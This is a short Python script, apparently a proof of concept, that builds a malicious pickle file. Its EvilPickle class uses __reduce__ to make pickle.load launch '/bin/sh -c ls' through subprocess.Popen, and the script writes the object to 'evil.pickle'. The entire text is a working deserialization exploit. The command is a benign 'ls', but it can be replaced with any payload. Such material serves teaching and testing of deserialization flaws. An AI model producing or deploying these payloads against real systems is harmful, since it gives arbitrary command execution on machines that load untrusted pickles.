import pickle
import subprocess

class EvilPickle:
    def __reduce__(self):
        return (subprocess.Popen, (("/bin/sh","-c","ls"),),)


e =  EvilPickle()

with open('evil.pickle', 'wb') as f:
    pickle.dump(e, f)
    